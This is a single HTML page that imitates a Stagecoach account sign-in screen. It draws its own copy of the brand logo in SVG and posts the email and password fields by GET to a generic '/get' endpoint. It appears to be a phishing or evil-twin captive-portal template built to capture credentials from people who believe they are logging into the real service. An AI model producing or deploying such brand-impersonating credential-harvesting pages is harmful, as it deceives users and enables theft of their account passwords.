<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
        }
        .container {
            max-width: 420px;
            padding: 25px;
            margin: auto;
        }
        .form {
            max-width: 300px;
            padding: 20px;
            border: 1px solid #cccccc;
            border-radius: 5px;
            margin: 0 auto;
            background: white;
        }
        h1 {
            text-align: center;
            color: #E65C00;
            font-size: 22px;
            margin: 18px 0 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #cccccc;
            border-radius: 4px;
        }
        button[type="submit"] {
            width: 100%;
            background-color: #E65C00;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button[type="submit"]:hover {
            background-color: #C44F00;
        }
        .logo {
            text-align: center;
            margin-bottom: 12px;
        }
        .logo svg {
            width: 260px;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 280 70" width="260" height="65">
                <!-- Iconic Stagecoach circle (Green / Orange / Blue) -->
                <circle cx="35" cy="35" r="32" fill="#009B77"/>          <!-- Green base -->
                <path d="M35 3 A32 32 0 0 1 67 35 L35 35 Z" fill="#FFA400"/> <!-- Orange -->
                <path d="M67 35 A32 32 0 0 1 35 67 L35 35 Z" fill="#0077C8"/> <!-- Blue -->
                
                <!-- Stagecoach text -->
                <text x="80" y="46" font-family="Arial Black, Arial, sans-serif" font-size="32" font-weight="900" fill="#051C2C">Stagecoach</text>
            </svg>
        </div>

        <form action="/get" method="get" id="email-form-step" class="form">
            <h1>Sign In with<br>your Stagecoach account</h1>
            <input name="email" type="text" placeholder="Email" required>
            <input name="password" type="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
